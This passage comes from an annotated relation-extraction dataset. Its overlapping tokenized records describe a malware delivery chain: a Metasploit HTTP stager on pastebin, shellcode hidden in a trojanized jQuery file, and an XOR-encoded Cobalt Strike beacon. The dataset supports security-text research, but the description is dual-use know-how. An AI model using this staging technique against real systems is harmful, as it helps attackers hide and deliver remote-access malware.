"2A", ")", "is", "usually", "hosted", "on", "a", "public", "hosting", "site", "such", "as", "pastebin.com", "."], ["The", "malicious", "file", "downloaded", "is", "usually", "a", "copy", "of", "a", "trojanized", "jquery.min.js", "file", "."], ["The", "malicious", "jQuery", "file", "consists", "of", ":", "Legitimate", "JavaScript", "(", "JS", ")", "code", "at", "the", "top", "and", "end", "of", "the", "file", "."], ["At", "a", "specific", "offset", "in", "the", "file", "is", "yet", "another", "shellcode", "(", "referred", "to", "as", "Stage", "3A", ")", "."], ["The", "Metasploit", "HTTP", "stager", "carries", "out", "the", "following", "actions", "in", "sequence", ":", "Connect", "to", "the", "malicious", "attacker-controlled", "IP", "address", "."], ["Download", "the", "malicious", "jquery-3", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [7, 7], "name": "IndigoDrop", "pos": [7, 8], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [10, 10], "name": "Blocked values", "pos": [10, 12], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [28, 28], "name": "Metasploit shellcode", "pos": [9, 11], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [33, 33], "name": "reverse HTTP stager", "pos": [14, 17], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [41, 41], "name": "file", "pos": [22, 23], "index": "4_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [46, 46], "name": "location", "pos": [27, 28], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [49, 49], "name": "shellcode", "pos": [1, 2], "index": "6_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [60, 60], "name": "hosting site", "pos": [12, 14], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [68, 68], "name": "file", "pos": [2, 3], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [76, 76], "name": "trojanized jquery.min.js file", "pos": [10, 13], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [82, 82], "name": "jQuery file", "pos": [2, 4], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [88, 88], "name": "JavaScript", "pos": [8, 9], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [108, 108], "name": "file", "pos": [6, 7], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [112, 112], "name": "shellcode", "pos": [10, 11], "index": "13_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [122, 122], "name": "Metasploit HTTP stager", "pos": [1, 4], "index": "14_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [138, 138], "name": "IP address", "pos": [17, 19], "index": "15_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [144, 144], "name": "jquery-3", "pos": [3, 4], "index": "16_0"}]], "labels": [{"r": "UK", "evidence": [0], "h": 0, "t": 1}, {"r": "EX", "evidence": [1], "t": 2, "h": 3}, {"r": "WR", "evidence": [1], "h": 3, "t": 4}, {"r": "ST", "evidence": [1], "h": 3, "t": 5}, {"r": "RF", "evidence": [1], "h": 3, "t": 5}, {"r": "CO", "evidence": [3], "h": 8, "t": 9}, {"r": "CO", "evidence": [4], "h": 10, "t": 11}, {"r": "CO", "evidence": [4, 5], "h": 10, "t": 12}, {"r": "CO", "evidence": [4, 5], "h": 10, "t": 13}, {"r": "ST", "evidence": [2, 3, 4, 5, 6], "t": 7, "h": 14}, {"r": "RF", "evidence": [2, 3, 4, 5, 6], "t": 7, "h": 14}, {"r": "ST", "evidence": [6], "h": 14, "t": 15}, {"r": "RF", "evidence": [6], "h": 14, "t": 15}, {"r": "WR", "evidence": [6, 7], "h": 14, "t": 16}]}, {"title": "643-25", "sents": [["Stage", "2A", ":", "Metasploit", "(", "MSF", ")", "downloader", "shellcodeThe", "Metasploit", "shellcode", "is", "a", "modified", "reverse", "HTTP", "stager", "meant", "to", "download", "a", "malicious", "file", "from", "the", "specified", "download", "location", "."], ["This", "shellcode", "(", "stage", "2A", ")", "is", "usually", "hosted", "on", "a", "public", "hosting", "site", "such", "as", "pastebin.com", "."], ["The", "malicious", "file", "downloaded", "is", "usually", "a", "copy", "of", "a", "trojanized", "jquery.min.js", "file", "."], ["The", "malicious", "jQuery", "file", "consists", "of", ":", "Legitimate", "JavaScript", "(", "JS", ")", "code", "at", "the", "top", "and", "end", "of", "the", "file", "."], ["At", "a", "specific", "offset", "in", "the", "file", "is", "yet", "another", "shellcode", "(", "referred", "to", "as", "Stage", "3A", ")", "."], ["The", "Metasploit", "HTTP", "stager", "carries", "out", "the", "following", "actions", "in", "sequence", ":", "Connect", "to", "the", "malicious", "attacker-controlled", "IP", "address", "."], ["Download", "the", "malicious", "jquery-3", "."], ["0.", "min.js", "file", "to", "an", "executable", "memory", "location", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [9, 9], "name": "Metasploit shellcode", "pos": [9, 11], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [14, 14], "name": "reverse HTTP stager", "pos": [14, 17], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [22, 22], "name": "file", "pos": [22, 23], "index": "2_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [27, 27], "name": "location", "pos": [27, 28], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [30, 30], "name": "shellcode", "pos": [1, 2], "index": "4_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [41, 41], "name": "hosting site", "pos": [12, 14], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [49, 49], "name": "file", "pos": [2, 3], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [57, 57], "name": "trojanized jquery.min.js file", "pos": [10, 13], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [63, 63], "name": "jQuery file", "pos": [2, 4], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [69, 69], "name": "JavaScript", "pos": [8, 9], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [89, 89], "name": "file", "pos": [6, 7], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [93, 93], "name": "shellcode", "pos": [10, 11], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [103, 103], "name": "Metasploit HTTP stager", "pos": [1, 4], "index": "12_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [119, 119], "name": "IP address", "pos": [17, 19], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [125, 125], "name": "jquery-3", "pos": [3, 4], "index": "14_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [128, 128], "name": "min.js", "pos": [1, 2], "index": "15_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [133, 133], "name": "memory location", "pos": [6, 8], "index": "16_0"}]], "labels": [{"r": "EX", "evidence": [0], "t": 0, "h": 1}, {"r": "WR", "evidence": [0], "h": 1, "t": 2}, {"r": "ST", "evidence": [0], "h": 1, "t": 3}, {"r": "RF", "evidence": [0], "h": 1, "t": 3}, {"r": "CO", "evidence": [2], "h": 6, "t": 7}, {"r": "CO", "evidence": [3], "h": 8, "t": 9}, {"r": "CO", "evidence": [3, 4], "h": 8, "t": 10}, {"r": "CO", "evidence": [3, 4], "h": 8, "t": 11}, {"r": "ST", "evidence": [1, 2, 3, 4, 5], "t": 5, "h": 12}, {"r": "RF", "evidence": [1, 2, 3, 4, 5], "t": 5, "h": 12}, {"r": "ST", "evidence": [5], "h": 12, "t": 13}, {"r": "RF", "evidence": [5], "h": 12, "t": 13}, {"r": "WR", "evidence": [5, 6], "h": 12, "t": 14}, {"r": "WR", "evidence": [5, 6, 7], "h": 12, "t": 15}, {"r": "ST", "evidence": [5, 6, 7], "h": 12, "t": 16}, {"r": "RF", "evidence": [5, 6, 7], "h": 12, "t": 16}]}, {"title": "643-26", "sents": [["This", "shellcode", "(", "stage", "2A", ")", "is", "usually", "hosted", "on", "a", "public", "hosting", "site", "such", "as", "pastebin.com", "."], ["The", "malicious", "file", "downloaded", "is", "usually", "a", "copy", "of", "a", "trojanized", "jquery.min.js", "file", "."], ["The", "malicious", "jQuery", "file", "consists", "of", ":", "Legitimate", "JavaScript", "(", "JS", ")", "code", "at", "the", "top", "and", "end", "of", "the", "file", "."], ["At", "a", "specific", "offset", "in", "the", "file", "is", "yet", "another", "shellcode", "(", "referred", "to", "as", "Stage", "3A", ")", "."], ["The", "Metasploit", "HTTP", "stager", "carries", "out", "the", "following", "actions", "in", "sequence", ":", "Connect", "to", "the", "malicious", "attacker-controlled", "IP", "address", "."], ["Download", "the", "malicious", "jquery-3", "."], ["0.", "min.js", "file", "to", "an", "executable", "memory", "location", "."], ["Jump", "to", "the", "malicious", "shellcode", "embedded", "in", "the", "jquery", "file", "and", "start", "executing", "Stage", "3A", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "shellcode", "pos": [1, 2], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [12, 12], "name": "hosting site", "pos": [12, 14], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [20, 20], "name": "file", "pos": [2, 3], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [28, 28], "name": "trojanized jquery.min.js file", "pos": [10, 13], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [34, 34], "name": "jQuery file", "pos": [2, 4], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [40, 40], "name": "JavaScript", "pos": [8, 9], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [60, 60], "name": "file", "pos": [6, 7], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [64, 64], "name": "shellcode", "pos": [10, 11], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [74, 74], "name": "Metasploit HTTP stager", "pos": [1, 4], "index": "8_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [90, 90], "name": "IP address", "pos": [17, 19], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [96, 96], "name": "jquery-3", "pos": [3, 4], "index": "10_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [99, 99], "name": "min.js", "pos": [1, 2], "index": "11_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [104, 104], "name": "memory location", "pos": [6, 8], "index": "12_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [111, 111], "name": "shellcode", "pos": [4, 5], "index": "13_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [115, 115], "name": "jquery file", "pos": [8, 10], "index": "14_0"}]], "labels": [{"r": "CO", "evidence": [1], "h": 2, "t": 3}, {"r": "CO", "evidence": [2], "h": 4, "t": 5}, {"r": "CO", "evidence": [2, 3], "h": 4, "t": 6}, {"r": "CO", "evidence": [2, 3], "h": 4, "t": 7}, {"r": "ST", "evidence": [0, 1, 2, 3, 4], "t": 1, "h": 8}, {"r": "RF", "evidence": [0, 1, 2, 3, 4], "t": 1, "h": 8}, {"r": "ST", "evidence": [4], "h": 8, "t": 9}, {"r": "RF", "evidence": [4], "h": 8, "t": 9}, {"r": "WR", "evidence": [4, 5], "h": 8, "t": 10}, {"r": "WR", "evidence": [4, 5, 6], "h": 8, "t": 11}, {"r": "ST", "evidence": [4, 5, 6], "h": 8, "t": 12}, {"r": "RF", "evidence": [4, 5, 6], "h": 8, "t": 12}, {"r": "CO", "evidence": [5, 6, 7], "h": 10, "t": 14}, {"r": "CO", "evidence": [5, 6, 7], "h": 10, "t": 13}]}, {"title": "643-27", "sents": [["The", "malicious", "file", "downloaded", "is", "usually", "a", "copy", "of", "a", "trojanized", "jquery.min.js", "file", "."], ["The", "malicious", "jQuery", "file", "consists", "of", ":", "Legitimate", "JavaScript", "(", "JS", ")", "code", "at", "the", "top", "and", "end", "of", "the", "file", "."], ["At", "a", "specific", "offset", "in", "the", "file", "is", "yet", "another", "shellcode", "(", "referred", "to", "as", "Stage", "3A", ")", "."], ["The", "Metasploit", "HTTP", "stager", "carries", "out", "the", "following", "actions", "in", "sequence", ":", "Connect", "to", "the", "malicious", "attacker-controlled", "IP", "address", "."], ["Download", "the", "malicious", "jquery-3", "."], ["0.", "min.js", "file", "to", "an", "executable", "memory", "location", "."], ["Jump", "to", "the", "malicious", "shellcode", "embedded", "in", "the", "jquery", "file", "and", "start", "executing", "Stage", "3A", "."], ["Malicious", "jquery", "file", ":", "Stage", "2A", "Metasploit", "shellcode", "downloading", "the", "jQuery", "file", "to", "executable", "memory", "and", "jumping", "to", "the", "specified", "offset", ":", "Stage", "3A", ":", "Decoder", "shellcodeThe", "malicious", "jQuery", "file", "contains", "the", "decoder", "shellcode", "(", "Stage", "3A", ")", "and", "the", "final", "Cobalt", "Strike", "beacon", "DLL", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [2, 2], "name": "file", "pos": [2, 3], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [10, 10], "name": "trojanized jquery.min.js file", "pos": [10, 13], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [16, 16], "name": "jQuery file", "pos": [2, 4], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [22, 22], "name": "JavaScript", "pos": [8, 9], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [42, 42], "name": "file", "pos": [6, 7], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [46, 46], "name": "shellcode", "pos": [10, 11], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [56, 56], "name": "Metasploit HTTP stager", "pos": [1, 4], "index": "6_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [72, 72], "name": "IP address", "pos": [17, 19], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [78, 78], "name": "jquery-3", "pos": [3, 4], "index": "8_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [81, 81], "name": "min.js", "pos": [1, 2], "index": "9_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [86, 86], "name": "memory location", "pos": [6, 8], "index": "10_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [93, 93], "name": "shellcode", "pos": [4, 5], "index": "11_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [97, 97], "name": "jquery file", "pos": [8, 10], "index": "12_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [106, 106], "name": "jquery file", "pos": [1, 3], "index": "13_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [111, 111], "name": "Metasploit shellcode", "pos": [6, 8], "index": "14_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [115, 115], "name": "jQuery file", "pos": [10, 12], "index": "15_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [133, 133], "name": "jQuery file", "pos": [28, 30], "index": "16_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [137, 137], "name": "decoder shellcode", "pos": [32, 34], "index": "17_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [148, 148], "name": "beacon DLL", "pos": [43, 45], "index": "18_0"}]], "labels": [{"r": "CO", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [1], "h": 2, "t": 3}, {"r": "CO", "evidence": [1, 2], "h": 2, "t": 4}, {"r": "CO", "evidence": [1, 2], "h": 2, "t": 5}, {"r": "ST", "evidence": [3], "h": 6, "t": 7}, {"r": "RF", "evidence": [3], "h": 6, "t": 7}, {"r": "WR", "evidence": [3, 4], "h": 6, "t": 8}, {"r": "WR", "evidence": [3, 4, 5], "h": 6, "t": 9}, {"r": "ST", "evidence": [3, 4, 5], "h": 6, "t": 10}, {"r": "RF", "evidence": [3, 4, 5], "h": 6, "t": 10}, {"r": "CO", "evidence": [4, 5, 6], "h": 8, "t": 12}, {"r": "CO", "evidence": [4, 5, 6], "h": 8, "t": 11}, {"r": "CO", "evidence": [4, 5, 6, 7], "h": 8, "t": 15}, {"r": "WR", "evidence": [5, 6, 7], "t": 9, "h": 14}, {"r": "ST", "evidence": [5, 6, 7], "t": 10, "h": 14}, {"r": "RF", "evidence": [5, 6, 7], "t": 10, "h": 14}, {"r": "WR", "evidence": [7], "h": 14, "t": 15}, {"r": "CO", "evidence": [7], "h": 13, "t": 18}, {"r": "CO", "evidence": [7], "h": 13, "t": 16}, {"r": "CO", "evidence": [7], "h": 13, "t": 17}]}, {"title": "643-28", "sents": [["The", "malicious", "jQuery", "file", "consists", "of", ":", "Legitimate", "JavaScript", "(", "JS", ")", "code", "at", "the", "top", "and", "end", "of", "the", "file", "."], ["At", "a", "specific", "offset", "in", "the", "file", "is", "yet", "another", "shellcode", "(", "referred", "to", "as", "Stage", "3A", ")", "."], ["The", "Metasploit", "HTTP", "stager", "carries", "out", "the", "following", "actions", "in", "sequence", ":", "Connect", "to", "the", "malicious", "attacker-controlled", "IP", "address", "."], ["Download", "the", "malicious", "jquery-3", "."], ["0.", "min.js", "file", "to", "an", "executable", "memory", "location", "."], ["Jump", "to", "the", "malicious", "shellcode", "embedded", "in", "the", "jquery", "file", "and", "start", "executing", "Stage", "3A", "."], ["Malicious", "jquery", "file", ":", "Stage", "2A", "Metasploit", "shellcode", "downloading", "the", "jQuery", "file", "to", "executable", "memory", "and", "jumping", "to", "the", "specified", "offset", ":", "Stage", "3A", ":", "Decoder", "shellcodeThe", "malicious", "jQuery", "file", "contains", "the", "decoder", "shellcode", "(", "Stage", "3A", ")", "and", "the", "final", "Cobalt", "Strike", "beacon", "DLL", "."], ["The", "beacon", "DLL", "is", ",", "however", ",", "XOR-encoded", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [2, 2], "name": "jQuery file", "pos": [2, 4], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [8, 8], "name": "JavaScript", "pos": [8, 9], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [28, 28], "name": "file", "pos": [6, 7], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [32, 32], "name": "shellcode", "pos": [10, 11], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [42, 42], "name": "Metasploit HTTP stager", "pos": [1, 4], "index": "4_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [58, 58], "name": "IP address", "pos": [17, 19], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [64, 64], "name": "jquery-3", "pos": [3, 4], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [67, 67], "name": "min.js", "pos": [1, 2], "index": "7_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [72, 72], "name": "memory location", "pos": [6, 8], "index": "8_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [79, 79], "name": "shellcode", "pos": [4, 5], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [83, 83], "name": "jquery file", "pos": [8, 10], "index": "10_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [92, 92], "name": "jquery file", "pos": [1, 3], "index": "11_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [97, 97], "name": "Metasploit shellcode", "pos": [6, 8], "index": "12_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [101, 101], "name": "jQuery file", "pos": [10, 12], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [119, 119], "name": "jQuery file", "pos": [28, 30], "index": "14_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [123, 123], "name": "decoder shellcode", "pos": [32, 34], "index": "15_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [134, 134], "name": "beacon DLL", "pos": [43, 45], "index": "16_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [138, 138], "name": "beacon DLL", "pos": [1, 3], "index": "17_0"}]], "labels": [{"r": "CO", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "ST", "evidence": [2], "h": 4, "t": 5}, {"r": "RF", "evidence": [2], "h": 4, "t": 5}, {"r": "WR", "evidence": [2, 3], "h": 4, "t": 6}, {"r": "WR", "evidence": [2, 3, 4], "h": 4, "t": 7}, {"r": "ST", "evidence": [2, 3, 4], "h": 4, "t": 8}, {"r": "RF", "evidence": [2, 3, 4], "h": 4, "t": 8}, {"r": "CO", "evidence": [3, 4, 5], "h": 6, "t": 10}, {"r": "CO", "evidence": [3, 4, 5], "h": 6, "t": 9}, {"r": "CO", "evidence": [3, 4, 5, 6], "h": 6, "t": 13}, {"r": "WR", "evidence": [4, 5, 6], "t": 7, "h": 12}, {"r": "ST", "evidence": [4, 5, 6], "t": 8, "h": 12}, {"r": "RF", "evidence": [4, 5, 6], "t": 8, "h": 12}, {"r": "WR", "evidence": [6], "h": 12, "t": 13}, {"r": "CO", "evidence": [6], "h": 11, "t": 16}, {"r": "CO", "evidence": [6], "h": 11, "t": 14}, {"r": "CO", "evidence": [6], "h": 11, "t": 15}, {"r": "CO", "evidence": [6, 7], "h": 11, "t": 17}]}, {"title": "643-29", "sents": [["At", "a", "specific", "offset", "in", "the", "file", "is", "yet", "another", "shellcode", "(", "referred", "to", "as", "Stage", "3A", ")", "."], ["The", "Metasploit", "HTTP", "stager", "carries", "out", "the", "following", "actions", "in", "sequence", ":", "Connect", "to", "the", "malicious", "attacker-controlled", "IP", "address", "."], ["Download", "the", "malicious", "jquery-3", "."], ["0.", "min.js", "file", "to", "an", "executable", "memory", "location", "."], ["Jump", "to", "the", "malicious", "shellcode", "embedded", "in", "the", "jquery", "file", "and", "start", "executing", "Stage", "3A", "."], ["Malicious", "jquery", "file", ":", "Stage", "2A", "Metasploit", "shellcode", "downloading", "the", "jQuery", "file", "to", "executable", "memory", "and", "jumping", "to", "the", "specified", "offset", ":", "Stage", "3A", ":", "Decoder", "shellcodeThe", "malicious", "jQuery", "file", "contains", "the", "decoder", "shellcode", "(", "Stage", "3A", ")", "and", "the", "final", "Cobalt", "Strike", "beacon", "DLL", "."], ["The", "beacon", "DLL", "is", ",", "however", ",", "XOR-encoded", "."], ["It", "is", "the", "responsibility", "of", "the", "decoder", "shellcode", "to", "decode", "and", "activate", "this", "final", "payload", "in", "the", "dropper", "process", "'", "memory", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [6, 6], "name": "file", "pos": [6, 7], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [10, 10], "name": "shellcode", "pos": [10, 11], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [20, 20], "name": "Metasploit HTTP stager", "pos": [1, 4], "index": "2_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [36, 36], "name": "IP address", "pos": [17, 19], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [42, 42], "name": "jquery-3", "pos": [3, 4], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [45, 45], "name": "min.js", "pos": [1, 2], "index": "5_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [50, 50], "name": "memory location", "pos": [6, 8], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [57, 57], "name": "shellcode", "pos": [4, 5], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [61, 61], "name": "jquery file", "pos": [8, 10], "index": "8_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [70, 70], "name": "jquery file", "pos": [1, 3], "index": "9_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [75, 75], "name": "Metasploit shellcode", "pos": [6, 8], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [79, 79], "name": "jQuery file", "pos": [10, 12], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [97, 97], "name": "jQuery file", "pos": [28, 30], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [101, 101], "name": "decoder shellcode", "pos": [32, 34], "index": "13_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [112, 112], "name": "beacon DLL", "pos": [43, 45], "index": "14_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [116, 116], "name": "beacon DLL", "pos": [1, 3], "index": "15_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [130, 130], "name": "decoder shellcode", "pos": [6, 8], "index": "16_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [138, 138], "name": "payload", "pos": [14, 15], "index": "17_0"}]], "labels": [{"r": "ST", "evidence": [1], "h": 2, "t": 3}, {"r": "RF", "evidence": [1], "h": 2, "t": 3}, {"r": "WR", "evidence": [1, 2], "h": 2, "t": 4}, {"r": "WR", "evidence": [1, 2, 3], "h": 2, "t": 5}, {"r": "ST", "evidence": [1, 2, 3], "h": 2, "t": 6}, {"r": "RF", "evidence": [1, 2, 3], "h": 2, "t": 6}, {"r": "CO", "evidence": [2, 3, 4], "h": 4, "t": 8}, {"r": "CO", "evidence": [2, 3, 4], "h": 4, "t": 7}, {"r": "CO", "evidence": [2, 3, 4, 5], "h": 4, "t": 11}, {"r": "WR", "evidence": [3, 4, 5], "t": 5, "h": 10}, {"r": "ST", "evidence": [3, 4, 5], "t": 6, "h": 10}, {"r": "RF", "evidence": [3, 4, 5], "t": 6, "h": 10}, {"r": "WR", "evidence": [5], "h": 10, "t": 11}, {"r": "CO", "evidence": [5], "h": 9, "t": 14}, {"r": "CO", "evidence": [5], "h": 9, "t": 12}, {"r": "CO", "evidence": [5], "h": 9, "t": 13}, {"r": "CO", "evidence": [5, 6], "h": 9, "t": 15}, {"r": "EX", "evidence": [5, 6, 7], "t": 13, "h": 16}, {"r": "WR", "evidence": [7], "h": 16, "t": 17}, {"r": "EX", "evidence": [7], "h": 16, "t": 17}]}, {"title": "643-30", "sents": [["The", "Metasploit", "HTTP", "stager", "carries", "out", "the", "following", "actions", "in", "sequence", ":", "Connect", "to", "the", "malicious", "attacker-controlled", "IP", "address", "."], ["Download", "the", "malicious", "jquery-3", "."], ["0.", "min.js", "file", "to", "an", "executable", "memory", "location", "."], ["Jump", "to", "the", "malicious", "shellcode", "embedded", "in", "the", "jquery", "file", "and", "start", "executing", "Stage", "3A", "."], ["Malicious", "jquery", "file", ":", "Stage", "2A", "Metasploit", "shellcode", "downloading", "the", "jQuery", "file", "to", "executable", "memory", "and", "jumping", "to", "the", "specified", "offset", ":", "Stage", "3A", ":", "Decoder", "shellcodeThe", "malicious", "jQuery", "file", "contains", "the", "decoder", "shellcode", "(", "Stage", "3A", ")", "and", "the", "final", "Cobalt", "Strike", "beacon", "DLL", "."], ["The", "beacon", "DLL", "is", ",", "however", ",", "XOR-encoded", "."], ["It", "is", "the", "responsibility", "of", "the", "decoder", "shellcode", "to", "decode", "and", "activate", "this", "final", "payload", "in", "the", "dropper", "process", "'", "memory", "."], ["Decoder", "shellcode", "decoding", "the", "final", "RAT", "payload", ":", "Stage", "3B", ":", "Cobalt", "Strike", "beaconThe", "final", "RAT", "payload", "is", "actually", "a", "Cobalt", "Strike", "beacon", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "Metasploit HTTP stager", "pos": [1, 4], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [17, 17], "name": "IP address", "pos": [17, 19], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [23, 23], "name": "jquery-3", "pos": [3, 4], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [26, 26], "name": "min.js", "pos": [1, 2], "index": "3_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [31, 31], "name": "memory location", "pos": [6, 8], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [38, 38], "name": "shellcode", "pos": [4, 5], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [42, 42], "name": "jquery file", "pos": [8, 10], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [51, 51], "name": "jquery file", "pos": [1, 3], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [56, 56], "name": "Metasploit shellcode", "pos": [6, 8], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [60, 60], "name": "jQuery file", "pos": [10, 12], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [78, 78], "name": "jQuery file", "pos": [28, 30], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [82, 82], "name": "decoder shellcode", "pos": [32, 34], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [93, 93], "name": "beacon DLL", "pos": [43, 45], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [97, 97], "name": "beacon DLL", "pos": [1, 3], "index": "13_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [111, 111], "name": "decoder shellcode", "pos": [6, 8], "index": "14_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [119, 119], "name": "payload", "pos": [14, 15], "index": "15_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [127, 127], "name": "Decoder shellcode", "pos": [0, 2], "index": "16_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [132, 132], "name": "RAT payload", "pos": [5, 7], "index": "17_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [142, 142], "name": "RAT payload", "pos": [15, 17], "index": "18_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [147, 147], "name": "Cobalt Strike beacon", "pos": [20, 23], "index": "19_0"}]], "labels": [{"r": "ST", "evidence": [0], "h": 0, "t": 1}, {"r": "RF", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "WR", "evidence": [0, 1, 2], "h": 0, "t": 3}, {"r": "ST", "evidence": [0, 1, 2], "h": 0, "t": 4}, {"r": 